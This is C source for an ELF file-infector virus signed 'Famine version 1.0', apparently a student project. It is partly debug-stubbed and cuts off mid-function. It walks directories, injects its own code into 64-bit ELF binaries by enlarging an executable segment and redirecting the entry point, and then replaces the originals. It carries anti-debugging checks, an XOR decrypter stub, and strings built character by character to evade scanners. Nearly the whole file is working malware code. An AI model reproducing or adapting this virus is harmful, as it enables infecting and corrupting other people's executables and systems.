//
// Created by Joris GOUNAND on 11/8/19.
//

#include <asm/unistd.h>
#include <asm/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
# include <stdbool.h>

#include <dirent.h>
#include <elf.h>
#include <string.h>

# include <stdio.h> // DELL printfs
# define SIZE_BEFORE_ENTRY_POINT 62

typedef struct	s_file
{
	int         fd;
	char		*data;
	size_t		size;
	bool        error;
}				t_file;
struct linux_dirent64 {
	long long        d_ino;    /* 64-bit inode number */
	unsigned long long        d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};


 size_t  ft_strlen(const char *s);
 int get_env_var(char *name, char *content, int content_size);
 int open_directory(char *path);
 void    *ft_memmove(void *dst, const void *src, size_t len);
 bool process_runing(void); //CHANGER L APPELLE DE DIR
 int do_the_job(char file[],size_t size, char *path);
 int             ft_strncmp(const char *s1, const char *s2, size_t n);
 int infect(char path[],size_t path_length);
 void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry);
 void	ft_putnbr(int nb);
 void		ft_putstr(char *s);
 int		ft_putchar(int c);
 int     ft_isdigit(int c);
 int ft_isallnum(char *str);
 size_t	put_sig(int fd);
 bool	im_infected(char *data);
 bool	is_infected2(char *data);
bool is_infected(const char *haystack, size_t n);

		void decrypter(unsigned long address_of_main);

 char            *ft_strnstr(char *s1, char *s2, size_t n);
 int             ft_strcmp(const char *s1, const char *s2);

#define PAGE_SIZE (0x4000)
#define PAGE_SZ64 PAGE_SIZE
# define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
type name(type1 arg1,type2 arg2, type3 arg3)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	register type3    arg_3        asm("rdx") = arg3;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall2(type,name,type1,arg1,type2,arg2)\
type name(type1 arg1,type2 arg2)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1   argument1        asm("rdi") = arg1;\
	register type2        arg_2        asm("rsi") = arg2;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}
# define __syscall1(type,name,type1,arg1)\
type name(type1 arg1)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	register type1  argument1        asm("rdi") = arg1;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

# define __syscall0(type,name)\
type name(void)\
{\
	register long long    syscall_no  asm("rax") = __NR_##name;\
	asm("syscall");\
	register type i asm("rax");\
return i;\
}

ssize_t read(int fd, void *buf, size_t count);
pid_t fork(void);
int close(int fd);
int exit(int status);
int fstat(int fd, struct stat *statbuf);
int rename(const char *oldpath, const char *newpath);
ssize_t read(int fd, void *buf, size_t count);
int open(const char *pathname, int flags, mode_t mode);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
               unsigned int count);

ssize_t write(int fd, const void *buf, size_t count);


unsigned long get_eip(void);
extern int yeah;
extern int real_start;
extern int myend;

extern int do_main(void);

_start()
{
	__asm__(".globl real_start\n"
	        "real_start:\n"
	       // "int3\n"
            "pushq %rax\n"
			"pushq %rbx\n"
			"pushq %rcx\n"
			"pushq %rdx\n"
			"pushq %rsi\n"
			"pushq %rdi\n"

			"pushq %r8\n"
			"pushq %r9\n"
			"pushq %r10\n"
			"pushq %r11\n"
			"pushq %r12\n"
			"pushq %r13\n"
			"pushq %r14\n"
			"pushq %r15\n"

		    "call do_main\n"
//	        "int3\n"
	        "jmp myend\n");

}


int do_main(void)
{
	pid_t pid;
	void *start;
	size_t size;


	if (process_runing())
		return (1);

	start = 0; //value get from the header
	size = 0; //value get from addr
//	pid = fork();
	//if (pid == 0) //children
//	{
		main_encrypt();
		//decrypt

//		exit (0);
//	}
	return (0);
}
__syscall0(pid_t, fork);
__syscall1(int, close, int, fd);
__syscall1(int, exit, int, status);
__syscall2(int, rename, const char *, old, const char *, new);
__syscall3(ssize_t, read, int, fd, void *, buf, size_t, count);
__syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
__syscall3(int, getdents64, unsigned int, fd, struct linux_dirent64*, dirp,  unsigned int, count);
// __syscall3(off_t, lseek, int, fd, off_t, offset,  int, whence);// a surpprimer
__syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count); // poura etre decalle apres (used for debug)

bool process_runing(void)
{
	return 0;
	int fd,i,dd, nread;
	char buf[256]; // = sizeof(struct dirent)
	char *TracerPid;
	char *Name;
	struct linux_dirent64 *d;
	char path[64];

	ft_putnbr(sizeof(struct linux_dirent64));
	fd = open ("/proc/self/status", 0,0);
	ft_putstr("open /proc/self/status\n");
	while((i =read(fd,buf,256)) > 0)
	{
		if ((TracerPid = ft_strnstr(buf,"TracerPid:",i)) != 0)
		{
			TracerPid += 10;
			while(*TracerPid == '\t' || *TracerPid == ' ')
				TracerPid++;
			if (*TracerPid != '0' && *TracerPid != '\n' && 0) // enlever le 0 pour gdb
				exit(1);
		}


	}
	close(fd);
	dd = open("/proc/",0x10000,0);
	if (dd <= 0)
	{
		ft_putstr("error opem /proc/\n");
		return 1;
	}
	ft_putstr("getdents64");
	ft_memmove(path,"/proc/",6);
	char cmdname[64];
	while ((nread = getdents64(dd, buf, 256)) > 0)
	{
		i = 0;
		while(i<nread)
		{
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			if (ft_isallnum(d->d_name) == 0)
			{
				ft_putstr("good :");
				ft_memmove(path + 6,d->d_name,ft_strlen(d->d_name)+ 1);
				ft_memmove(path + ft_strlen(path), "/status\0", 8);
				fd = open(path,0,0);
				ft_putnbr(fd);
				ft_putchar('\n');

				ft_putstr(path);
				ft_putchar('\n');

				read(fd,cmdname, 64);
				if ((Name = ft_strnstr(cmdname,"Name:",i)) != 0)
				{
					Name += 5;
					while(*Name == '\t' || *Name == ' ')
						Name++;
					*ft_strnstr(Name, "\n",50) = '\0';
					if (!ft_strcmp(Name, "login"))
						exit(1);
					ft_putstr(Name);
					ft_putchar('\n');


				}

			}
		}
	}
	return (0);
}



void	ft_putnbr(int nb)
{

		if (nb < 0)
		{
			ft_putchar('-');
			nb = -nb;
		}
		if (nb > 9)
		{
			ft_putnbr(nb / 10);
			ft_putnbr(nb % 10);
		}
		else
			ft_putchar((char)nb + 48);
} // can be delete == debug
int	ft_putchar(int c)
{
	return (write(1, &c, 1));
}// can be delete == debug
void		ft_putstr(char *s)
{
	if (!s)
		return ;
	write(1, s, ft_strlen(s));
}// can be delete == debug
int     ft_isdigit(int c)
{
	if ((c >= '0') && (c <= '9'))
		return (1);
	return (0);
}
int ft_isallnum(char *str)
{
	while(*str)
	{
		if (!ft_isdigit(*str))
			return 1;
		str++;
	}
	return 0;
}
void    *ft_memcpy(void *dst, const void *src, size_t n)
{
	unsigned char   *srctmp;
	unsigned char   *dsttmp;
	size_t                  i;

	srctmp = (unsigned char *)src;
	dsttmp = (unsigned char *)dst;
	i = 0;
	while (i < n)
	{
		dsttmp[i] = srctmp[i];
		i++;
	}
	return ((void *)dst);
}
void    *ft_memmove(void *dst, const void *src, size_t len)
{
	char    *srctmp;
	char    *dsttmp;

	srctmp = (char *)src;
	dsttmp = (char *)dst;
	if (srctmp < dsttmp)
	{
		srctmp = (srctmp + len) - 1;
		dsttmp = (dsttmp + len) - 1;
		while (len-- > 0)
			*dsttmp-- = *srctmp--;
	}
	else
		ft_memcpy(dst, src, len);
	return ((void *)dst);
}
char            *ft_strnstr(char *s1, char *s2, size_t n)
{
	size_t  i;

	if (!(*s2))
		return ((char *)s1);
	while (*s1 && n--)
	{
		if (*s1 == s2[0])
		{
			i = 1;
			while (n-- && s1[i] && s2[i] && s1[i] == s2[i])
				++i;
			if (i == ft_strlen(s2))
				return ((char *)s1);
			n += i;
		}
		s1++;
	}
	return (NULL);
}
size_t  ft_strlen(const char *s)
{
	size_t  i;

	i = 0;
	while (*(s + i) != '\0')
	{
		i++;
	}
	return (i);
}
int             ft_strcmp(const char *s1, const char *s2)
{
	int     index;

	index = 0;
	while (s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}
void decrypter(unsigned long address_of_main)
{
	size_t	size;
	size_t	offset;
	char	*start;

	offset = *(int *)(address_of_main - 4 + sizeof(offset));
	size = *(int *)(address_of_main - 4);
	if(size && im_infected(address_of_main))
	{
		start[offset] ^= *(int *)(address_of_main - 4);
		offset++;
		while (offset < size)
		{
			start[offset] ^= start[offset - 1];
			offset++;
		}
	}
}
bool	im_infected(char *data)
{
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';
	int i;

	i = 0;
	while(sig[i])
	{
		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
			return(0);
		i++;
	}
	return(1);
}
int main_encrypt()
{
	char path_maj[6];
	path_maj[0] = 'P';
	path_maj[1] = 'A';
	path_maj[2] = 'T';
	path_maj[3] = 'H';
	path_maj[4] = '=';
	path_maj[5] = 0;

	char path_env[256];

	path_env[0] = '/';
	path_env[1] = 't';
	path_env[2] = 'm';
	path_env[3] = 'p';
	path_env[4] = '/';
	path_env[5] = 't';
	path_env[6] = 'e';
	path_env[7] = 's';
	path_env[8] = 't';
	path_env[9] = ':';
	path_env[10] = '/';
	path_env[11] = 't';
	path_env[12] = 'm';
	path_env[13] = 'p';
	path_env[14] = '/';
	path_env[15] = 't';
	path_env[16] = 'e';
	path_env[17] = 's';
	path_env[18] = 't';
	path_env[19] = '2';
	path_env[20] = ':';
	path_env[21] = 0;


	//printf("virus\n");
	//printf("content: %s\n",path_env);
	get_env_var(path_maj,path_env + 21,256 - 21);
	//printf("content %s\n",path_env);
	size_t path_length = ft_strlen(path_env);
	size_t i = 0;
	ft_putstr(path_maj);
	int length_path =0;
	do
	{
		if(path_env[i] == ':')
		{
			path_env[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path_env[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path_env[i] = ':';
			length_path = -1;
		}
		else if (path_env[i] == '\0')
		{
			if (length_path)
				open_directory(&path_env[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);

	infect(path_env, 256);
	char content[9];
	content[0] ='c';
	content[1] ='o';
	content[2] ='n';
	content[3] ='t';
	content[4] ='e';
	content[5] ='n';
	content[6] ='t';
	content[7] =':';
	content[8] =' ';
	write(1,content,9);
	write(1,path_env,ft_strlen(path_env));
}
__syscall1(int, unlink, const char *, pathname);
__syscall2(int, fstat, int, fildes, struct stat * , buf);
__syscall3(off_t, lseek, int, fildes, off_t, offset, int, whence);
size_t crypter(char *read, size_t size, char key, int fd);


int get_env_var(char *name, char *content, int content_size)
{
	char buf[4];
	int fd;
	size_t n,i;
	int j,k = 0;
	int nb_start = 1;
	int name_lenght = ft_strlen(name);
	char path_proc[19];
	path_proc[0] ='/';
	path_proc[1] ='p';
	path_proc[2] ='r';
	path_proc[3] ='o';
	path_proc[4] ='c';
	path_proc[5] ='/';
	path_proc[6] ='s';
	path_proc[7] ='e';
	path_proc[8] ='l';
	path_proc[9] ='f';
	path_proc[10] ='/';
	path_proc[11] ='e';
	path_proc[12] ='n';
	path_proc[13] ='v';
	path_proc[14] ='i';
	path_proc[15] ='r';
	path_proc[16] ='o';
	path_proc[17] ='n';
	path_proc[18] = 0;

	if ((fd = open(path_proc,0x0000,0))<0)
		return (0);
	do
	{
		n = read(fd,buf,4);
		for (i= 0; i < n ; ++i)
		{
			if (nb_start)
			{
				if (k != name_lenght)
				{
					if (buf[i] == name[k])
						k++;
					else
					{
						k = 0;
						nb_start = 0;
						j = 0;
					}
				}
				else if (j < content_size - 1)
				{
					if (buf[i] == '\0')
						goto  out;
					content[j++] = buf[i];
				}
				else
					goto out;
			}
			else if (buf[i] == '\0')
				nb_start = 1;
		}
	}
	while(n);
	out:
	content[j] = '\0';
	close(fd);
	return (content[0] != '\0');
}

int open_directory(char *path)
{
	int dd,nread;
	char buf[128];
	char path_file[256];
	struct linux_dirent64 *d;
	size_t len;

	char directory[12];
	directory[0] ='d';
	directory[1] ='i';
	directory[2] ='r';
	directory[3] ='e';
	directory[4] ='c';
	directory[5] ='t';
	directory[6] ='o';
	directory[7] ='r';
	directory[8] ='y';
	directory[9] =':';
	directory[10] =' ';
	directory[11] = 0;
	ft_putstr(directory);
	write(1,path,ft_strlen(path));
	write(1,"\n",1);
	//printf("directory: '%s'\n",path);

	//path = "/tmp/toto";
	path[0] = '/';
	path[1] = 't';
	path[2] = 'm';
	path[3] = 'p';
	path[4] = '/';
	path[5] = 't';
	path[6] = 'o';
	path[7] = 't';
	path[8] = 'o';
	path[9] = 0;

	dd = open (path, 0x10000,0);
	if (dd < 0)
	{
		char fail[10];
		fail[0] ='o';
		fail[1] ='p';
		fail[2] ='e';
		fail[3] ='n';
		fail[4] =' ';
		fail[5] = 'f';
		fail[6] ='a';
		fail[7] ='i';
		fail[8] ='l';
		fail[9] = 0;
		ft_putstr(fail);
		ft_putstr(path);
		ft_putchar('\n');
		//printf("open fail: '%s'\n",path);

		return 1;

	}
	char getd[12];
	getd[0] ='g';
	getd[1] ='e';
	getd[2] ='t';
	getd[3] ='d';
	getd[4] ='e';
	getd[5] ='n';
	getd[6] ='t';
	getd[7] ='s';
	getd[8] ='6';
	getd[9] ='4';

	getd[10] ='\n';
	getd[11] =0;
	ft_putstr(getd);
	ft_putstr(getd);
	//printf("getdents64\n");
	;
	char name_nread[8];
	name_nread[0] ='n';
	name_nread[1] ='r';
	name_nread[2] ='e';
	name_nread[3] ='a';
	name_nread[4] ='d';
	name_nread[5] =' ';
	name_nread[6] =':';
	name_nread[7] = 0;

	ft_putnbr(nread);

	//printf("nread %d\n",nread);
//	__asm__("int3");
	int c;
	int i;
	while ((nread = getdents64(dd, buf, 128)) > 0)
	{
		for (i = 0 ; i < nread;)
		{
			ft_putchar('c');
			d = (struct linux_dirent64 *) (buf + i);
			i += d->d_reclen ;
			char host[7];
			host[0]='h';
			host[1] ='o';
			host[2] ='s';
			host[3] ='t';
			host[4] =' ';
			host[5] =':';
			host[6] =0;

			ft_putstr(host);
			ft_putstr(d->d_name);
			char type[7];
			type[0] =' ';
			type[1] ='t';
			type[2] ='y';
			type[3] ='p';
			type[4] ='e';
			type[5] =' ';
			type[6] =0;
			ft_putstr(type);
			ft_putnbr(d->d_type);
			ft_putchar('\n');
			//printf("host %s type %d\n",d->d_name, d->d_type);
			if (d->d_name[0] == '.')
				continue;
			len = ft_strlen(path);
			ft_memmove(path_file,path,len);
			path_file[len] = '/';
			ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
			path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
			ft_putstr(d->d_name);
			ft_putchar(' ');
			ft_putstr(path_file);
			ft_putchar('\n');
			//printf("%s %s\n",d->d_name,path_file);
			struct stat st;
			int fd = open (path_file, 0,0);
			fstat(fd , &st);
			char mem[st.st_size];
			int c = read(fd, mem,st.st_size);
			//write(1,mem,st.st_size);
			do_the_job(mem,st.st_size,path_file);
		}
	}
	close(dd);
	return 0;
}

int do_the_job(char buff[],size_t size, char *path)
{
 	char debut[18];
 	debut[0]='d';
 	debut[1] ='e';
 	debut[2] ='b';
 	debut[3] ='u';
 	debut[4] ='t';
 	debut[5] =' ';
 	debut[6] ='d';
 	debut[7] ='o';
 	debut[8] ='_';
 	debut[9] ='t';
 	debut[10] ='h';
 	debut[11] ='e';
 	debut[12] ='_';
 	debut[13] ='j';
 	debut[14] ='o';
 	debut[15] ='b';
 	debut[16] ='\n';
 	debut[17] =0;
	ft_putstr(debut);
	//printf("debut do_the_job\n");

	unsigned int payload_len = ((char *)&myend - (char *)&real_start )+ SIZE_BEFORE_ENTRY_POINT;
ft_putnbr(payload_len);
ft_putchar('\n');
	Elf64_Addr parasite_vaddr;
	int text_found = 0;
	int i;
	char ono[3];
	ono[0] = '1';
	ono[1]='\n';
	ono[2]=0;
	ft_putstr(ono);
	ft_putnbr(size);
	write(1, buff, 20);
	ft_putchar('\n');

	ft_putchar('3');
	ft_putchar('.');
	ft_putchar('1');
	ft_putchar('\n');
	if (size < sizeof(Elf64_Ehdr)  || buff[EI_MAG0] != 0x7f || buff[EI_MAG1] != 'E' || buff[EI_MAG2] != 'L' || buff[EI_MAG3] != 'F'  || buff[EI_CLASS] != ELFCLASS64)
	{
		ft_putchar('\n');
		return (1);
	}
	ft_putchar('3');
	ft_putchar('.');
	ft_putchar('2');
	ft_putchar('\n');


	Elf64_Ehdr* hdr;
	Elf64_Phdr* phdr;
	Elf64_Shdr* shdr;
	Elf64_Addr entry, payload_vaddr, text_end;


	// Get the elf_header
	hdr = (Elf64_Ehdr*) buff;

	// Get some value from the elf_hdr

	entry = hdr->e_entry;

	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
	uint64_t text;
	// Increase section header offset by PAGE_SIZE

	hdr->e_shoff += PAGE_SZ64;

	for(int i=0; i < hdr->e_phnum; i++){
		if(is_infected(buff + phdr[i].p_offset, phdr[i].p_filesz))
		{
			char deja[15];
			deja[0]='d';
			deja[1] ='e';
			deja[2] ='j';
			deja[3] ='a';
			deja[4] =' ' ;
			deja[5] ='i';
			deja[6] ='n';
			deja[7] ='f';
			deja[8] ='e';
			deja[9] ='c';
			deja[10] ='t';
			deja[11] ='e';
			deja[12] ='d';
			deja[13] ='\n';
			deja[14] =0;
			ft_putstr(deja);
			return (1);

		}

		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){



			//puts("text found");
			text = phdr[i].p_offset;
			text_end = phdr[i].p_offset + phdr[i].p_filesz;
			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
			hdr->e_entry = payload_vaddr + 63;
			phdr[i].p_filesz += payload_len +100;
			phdr[i].p_memsz += payload_len + 100;
			phdr[i].p_flags |= PF_X;
			break;
		}
	}
	ft_putchar('4');
	ft_putchar('\n');
	new_file(buff,size,text_end, path,entry);
	char fin[5];
	fin[0] ='f';
	fin[1]='i';
	fin[2]='n';
	fin[3]='\n';
	fin[4]=0;
	ft_putstr(fin);
	return 0;
}

int infect(char path[],size_t path_length)
{
	size_t i = 0;

	int length_path =0;
	do
	{
		if(path[i] == ':')
		{
			path[i] = '\0';
			//open_directory(&path[i] - length_path);
			open_directory(&path[i] - length_path);
			//write(1,&path[i] - length_path, length_path);
			//write(1,"\n",1);
			path[i] = ':';
			length_path = -1;
		}
		else if (path[i] == '\0')
		{
			if (length_path)
				open_directory(&path[i] - length_path);
			break ;
		}
		i++;
		length_path++;
	}
	while(i < path_length);
	return 0;
}

char    *only_name(char *line)
{
	int        size;
	size = ft_strlen(line);
	size++;
	while (--size)
	{
		if (line[size] == '/')
			return (&(line[size + 1]));
	}
	return (line);
}

void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_Addr old_e_entry)
{
	int fd;
	char tmp[125];
	unsigned int parasite_size = ((char *)&myend - (char *)&real_start) + 30;
	char jmp_code[7];

	jmp_code[0] = '\x68'; /* push */
	jmp_code[1] = '\x00'; /* 00 	*/
	jmp_code[2] = '\x00'; /* 00	*/
	jmp_code[3] = '\x00'; /* 00	*/
	jmp_code[4] = '\x00'; /* 00	*/
	jmp_code[5] = '\xc3'; /* ret */
	jmp_code[6] = 0;

	ft_putnbr(old_e_entry);
	//exit(4);
	*(unsigned int*) &jmp_code[1] = old_e_entry;
	write(1,jmp_code,7);
	char new_debut [4];
	new_debut[0] ='n';
	new_debut[1] ='e';
	new_debut[2] ='w';
	new_debut[3] ='\n';
	write(1,new_debut,4);

	for (int i = 0; i< 125;i++)
		tmp[i] = 0;


	ft_memmove(tmp,path,ft_strlen(path));
	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
	*only_name(tmp) = '.';
	ft_putstr(tmp);
	ft_putchar('\n');

	if ((fd = open (tmp, 0x242, 0755)) < 0)
	{
		char error[3];
		error[0] ='e';
		error[1] ='r';
		error[2] ='r';
		write(2,error,3);
		return ;
	}
	ft_putstr(new_debut);
	ft_putchar('\n');

	ft_putnbr(end_of_text);

	ft_putchar('\n');
	ft_putnbr(fd);

	ft_putchar('\n');

	write(fd,buf, end_of_text);


	ft_putchar('5');
	ft_putchar('\n');
	unsigned long address_of_start = get_eip() - ((char *)&yeah - (char *)&real_start);
	unsigned long address_of_start_encrypt = get_eip() - ((char *)&yeah - (char *)&main_encrypt);

	size_t size_wrote = 0;
	ft_putchar('6');
	ft_putchar('\n');
	size_wrote =	put_sig(fd);

	ft_putchar('7');
	ft_putchar('\n');
	ft_putnbr(size_wrote);
	ft_putchar('\n');

	 //size_wrote += write(fd,"\xcc",1);
	ft_putchar('8');
	ft_putchar('\n');
	size_wrote += write(fd,(char *) address_of_start, parasite_size - 7);
	//size_wrote += crypter(address_of_start_encrypt, parasite_size - 7 - (address_of_start_encrypt - address_of_start) , 56, fd);
	ft_putchar('9');
	ft_putchar('\n');
	size_wrote += write(fd,jmp_code,7);
	ft_putchar('1');ft_putchar('0');
	ft_putchar('\n');
	ft_putnbr(size_wrote); ft_putchar(' ');ft_putnbr(PAGE_SIZE); ft_putchar('\n');
	for (int i = 0; i< PAGE_SIZE - size_wrote ;i++)
		write(fd,"j",1);
	ft_putchar('1');ft_putchar('1');
	ft_putchar('\n');
	write(fd,buf + end_of_text, size - end_of_text);
	ft_putchar('1');ft_putchar('2');
	ft_putchar('\n');
	//lseek(fd, end_of_text, SEEK_SET);

	char old[4] ;
	old[0] ='o';
	old[1] ='l';
	old[2] ='d';
	old[3] =' ' ;
	ft_putchar('1');ft_putchar('3');
	ft_putchar('\n');
	write(1,old,4);
	ft_putchar('1');ft_putchar('4');
	ft_putchar('\n');
	ft_putnbr(old_e_entry);
	ft_putchar('\n');
	//write(fd,needle, 62);

	char para[16];
	para[0] ='s';
	para[1] ='i';
write(1,para,2);
	ft_putnbr(parasite_size);
	ft_putchar('\n');


	//printf("tmp %s, path %s\n",tmp, path);
	close(fd);

	unlink(path);
	int ret = rename (tmp, path);
	char name_renam[12];
	name_renam[0] ='f';
	name_renam[1] ='i';
	name_renam[2] ='n';
	name_renam[3] =' ';
	write(1,name_renam,4);
	ft_putnbr(ret);
	ft_putchar('\n');

}

int             ft_strncmp(const char *s1, const char *s2, size_t n)
{
	size_t  index;

	index = 0;
	while (index < n && s1[index] && s2[index] &&
	       (unsigned char)s1[index] == (unsigned char)s2[index])
	{
		index++;
	}
	if (index >= n)
		return (0);
	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
}
bool is_infected(const char *haystack, size_t n)
{
	unsigned int	i;
	unsigned int	j;
	unsigned int	k;
	char needle[54];
	needle[0] ='F';
	needle[1] ='a';
	needle[2] ='m';
	needle[3] ='i';
	needle[4] ='n';
	needle[5] ='e';
	needle[6] =' ';
	needle[7] ='v';
	needle[8] ='e';
	needle[9] ='r';
	needle[10] ='s';
	needle[11] ='i';
	needle[12] ='o';
	needle[13] ='n';
	needle[14] =' ';
	needle[15] ='1';
	needle[16] ='.';
	needle[17] ='0';
	needle[18]=' ';
	needle[19]='(';
	needle[20]='c';
	needle[21]=')';
	needle[22]='o';
	needle[23]='d';
	needle[24]='e';
	needle[25]='d';
	needle[26]=' ';
	needle[27]='b';
	needle[28]='y';
	needle[29]=' ';
	needle[30]='<';
	needle[31]='j';
	needle[32]='g';
	needle[33]='o';
	needle[34]='u';
	needle[35]='n';
	needle[36]='a';
	needle[37]='n';
	needle[38]='d';
	needle[39]='>';
	needle[40]='-';
	needle[41]='<';
	needle[42]='a';
	needle[43]='f';
	needle[44]='i';
	needle[45]='o';
	needle[46]='d';
	needle[47]='i';
	needle[48]='e';
	needle[49]='r';
	needle[50]='>';
	needle[51]=' ';
	needle[52]='-';
	needle[53]=' ';
	i = 0;
	if (!needle[0])
		return ((char *)haystack);
	while (n--)
	{
		j = i;
		k = 0;
		while (haystack[j] == needle[k])
		{
			j++;
			k++;
			if (!needle[k])
				return 1;
		}
		i++;
	}
	return (0);
}
bool	is_infected2(char *data)
{
	Elf64_Ehdr          *header;
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';
	int i;

	i = 0;
	header = (Elf64_Ehdr *)data;
	char name_enter[16];
	name_enter[0] ='e';
	name_enter[1]='n';
	name_enter[2]='t';
	name_enter[3]='e';
	name_enter[4]='r';
	name_enter[5]=' ';
	name_enter[6]='i';
	name_enter[7]='n';
	name_enter[8]='f';
	name_enter[9]='e';
	name_enter[10]='c';
	name_enter[11]='t';
	name_enter[12]='e';
	name_enter[13]='d';
	name_enter[14]='\n';
	name_enter[15]=0;
	ft_putstr(name_enter);
		while(sig[i])
		{
			ft_putnbr(i);
			if (sig[i] !=  *((char *)(data + header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
			{
				char is_inf[18];
				is_inf[0]='i';
				is_inf[1]='s';
				is_inf[2]=' ';
				is_inf[3]='i';
				is_inf[4]='n';
				is_inf[5]='f';
				is_inf[6]='e';
				is_inf[7]='c';
				is_inf[8]='t';
				is_inf[9]='e';
				is_inf[10]='d';
				is_inf[11]=' ' ;
				is_inf[12]='r';
				is_inf[13]='e';
				is_inf[14]='t';
				is_inf[15]=' ' ;
				is_inf[16]='0';
				is_inf[17]=0;
				ft_putstr(is_inf);
				return(0);

			}
			i++;
		}
		char name_ret[7];
	name_ret[0] ='r';
	name_ret[1]='e';
	name_ret[2]='t';
	name_ret[3]=' ';
	name_ret[4]='1';
	name_ret[5]='\n';
	name_ret[6]=0;
	ft_putstr(name_ret);

	return(1);
}

size_t	put_sig(int fd)
{
	char sig[54];
	sig[0] ='F';
	sig[1] ='a';
	sig[2] ='m';
	sig[3] ='i';
	sig[4] ='n';
	sig[5] ='e';
	sig[6] =' ';
	sig[7] ='v';
	sig[8] ='e';
	sig[9] ='r';
	sig[10] ='s';
	sig[11] ='i';
	sig[12] ='o';
	sig[13] ='n';
	sig[14] =' ';
	sig[15] ='1';
	sig[16] ='.';
	sig[17] ='0';
	sig[18]=' ';
	sig[19]='(';
	sig[20]='c';
	sig[21]=')';
	sig[22]='o';
	sig[23]='d';
	sig[24]='e';
	sig[25]='d';
	sig[26]=' ';
	sig[27]='b';
	sig[28]='y';
	sig[29]=' ';
	sig[30]='<';
	sig[31]='j';
	sig[32]='g';
	sig[33]='o';
	sig[34]='u';
	sig[35]='n';
	sig[36]='a';
	sig[37]='n';
	sig[38]='d';
	sig[39]='>';
	sig[40]='-';
	sig[41]='<';
	sig[42]='a';
	sig[43]='f';
	sig[44]='i';
	sig[45]='o';
	sig[46]='d';
	sig[47]='i';
	sig[48]='e';
	sig[49]='r';
	sig[50]='>';
	sig[51]=' ';
	sig[52]='-';
	sig[53]=' ';
	char fingerprint[9];
	fingerprint[0]= '0';
	fingerprint[1]='0';
	fingerprint[2]='0';
	fingerprint[3]='0';
	fingerprint[4]='0';
	fingerprint[5]='0';
	fingerprint[6]='0';
	fingerprint[7]='0';
	fingerprint[8]=0;
	int i;
	size_t size;
	unsigned long address_of_main = get_eip() - ((char *)&yeah - (char *)&real_start);

	if (im_infected(address_of_main))
	{
			char name_new[9];
		name_new[0]='n';
		name_new[1]='e';
		name_new[2]='w';
		name_new[3]=' ';
		name_new[4]='o';
		name_new[5]='n';
		name_new[6]='e';
		name_new[7]='\n';
		name_new[8]=0;
